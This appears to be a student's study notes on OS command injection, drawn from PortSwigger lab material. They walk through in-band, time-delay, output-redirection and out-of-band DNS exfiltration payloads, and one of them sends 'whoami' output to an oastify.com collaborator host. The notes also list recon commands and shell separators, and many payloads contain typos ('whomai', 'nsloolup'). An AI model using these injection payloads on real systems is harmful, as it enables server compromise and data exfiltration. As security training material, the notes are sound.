# What is this ?
- a web vulnerabilities  
-  to allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data
- #### ![[p2.png]]
# Injecting OS commands

In this example, a shopping application lets the user view whether an item is in stock in a particular store. This information is accessed via a URL:
`https://insecure-website.com/stockStatus?productID=381&storeID=29`

To provide the stock information, the application must query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments:
`stockreport.pl 381 29`

This command outputs the stock status for the specified item, which is returned to the user.

The application implements no defenses against OS command injection, so an attacker can submit the following input to execute an arbitrary command:
`& echo aiwefwlguh &`

If this input is submitted in the productID parameter, the command executed by the application is:
`stockreport.pl & echo aiwefwlguh & 29`

The echo command causes the supplied string to be echoed in the output. This is a useful way to test for some types of OS command injection. The & character is a shell command separator. In this example, it causes three separate commands to execute, one after another. The output returned to the user is:
Error - productID was not provided
aiwefwlguh
29: command not found

The three lines of output demonstrate that:

    The original stockreport.pl command was executed without its expected arguments, and so returned an error message.
    The injected echo command was executed, and the supplied string was echoed in the output.
    The original argument 29 was executed as a command, which caused an error.

Placing the additional command separator & after the injected command is useful because it separates the injected command from whatever follows the injection point. This reduces the chance that what follows will prevent the injected command from executing.
LAB
APPRENTICE
OS command injection, simple case
## Lab: OS command injection, simple case
- [link](https://portswigger.net/web-security/os-command-injection/lab-simple)
- step 1
	- finding injected point
		- `storeId=1`
	- exploiting
```shell
sstoreId=1 | whomai
``` 
## Useful commands
```shell
# in linux
whoami        
uname -a        
ifconfig        
netstat -an        
network connections           
ps -ef

# in windows
whoami   
var    
ipconfig /all    
netstat an    
tasklist
```
# Blind Mode
- This means that the application **does not return** the output from the command within its HTTP response
    
- imagine
    - a website that lets users submit feedback about the site. The user enters their email address and feedback message. The server-side application then generates an email to a site administrator containing the feedback. To do this, it calls out to the mail program with the submitted details:
        
        - `mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com`
### Detecting blind OS command injection using time delays

You can use an injected command to trigger a time delay, enabling you to confirm that the command was executed based on the time that the application takes to respond. The `ping` command is a good way to do this, because lets you specify the number of ICMP packets to send. This enables you to control the time taken for the command to run:

`& ping -c 10 127.0.0.1 &`

This command causes the application to ping its loopback network adapter for 10 seconds.

#### Laboratory
- #####  [link](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
- 1
	- detecting injected point 
		- email in packet
			- email=slar..
	- exploit
		- email=s||ping+-c+11+ip
### Exploiting blind OS command injection by redirecting output

You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. For example, if the application serves static resources from the filesystem location `/var/www/static`, then you can submit the following input:

`& whoami > /var/www/static/whoami.txt &`

The `>` character sends the output from the `whoami` command to the specified file. You can then use the browser to fetch `https://vulnerable-website.com/whoami.txt` to retrieve the file, and view the output from the injected command.

LAB
 [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
- step 1
	- detecting injected point
		- email=s
	- exploit
		- **lab discretion /var/www/images **
		- see , web server how show images
			- url/images/?filename=picture1.png
		- OK, We are ready to go explioting. 
		- payload
			- `email=s||whomai+>+/var/www/images/output.html`
			- go see open output.html
				- `url/images/?filename=output.html`
### Exploiting blind OS command injection using out-of-band (OAST) techniques

- You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:
- 
- `& nslookup kgji2ohoyw.web-attacker.com &`
- 
- This payload uses the `nslookup` command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.
- ##### [laboratory](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
	- ##### how exploit
		- step 1
			- detection injected point
				- `emial+s`
		- step 2
			-  we use **collaborator** in **Pro Brup**
				- create a new dns server ..
				- payload
				- we use subshell [[Bash#what is subshells]]
				- 
	```shell

emial=s||nsloolup+(whomain).l1n4dsua7rkwx1k6ewmrwqgzjqphda1z.oastify.com||
# or 
emial=s||nsloolup+`whomain`.l1n4dsua7rkwx1k6ewmrwqgzjqphda1z.oastify.com||
```
- ##### [laboratory 2](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
	- practice in this lab
## Ways of injecting OS commands

You can use a number of shell meta characters to perform OS command injection attacks.

A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:

- `&`
- `&&`
- `|`
- `||`

The following command separators work only on Unix-based systems:

- `;`
- Newline (`0x0a` or `\n`)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

- `` ` `` injected command `` ` ``
- `$(` injected command `)`

The different shell metacharacters have subtly different behaviors that might change whether they work in certain situations. This could impact whether they allow in-band retrieval of command output or are useful only for blind exploitation.

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using `"` or `'`) before using suitable shell metacharacters to inject a new command.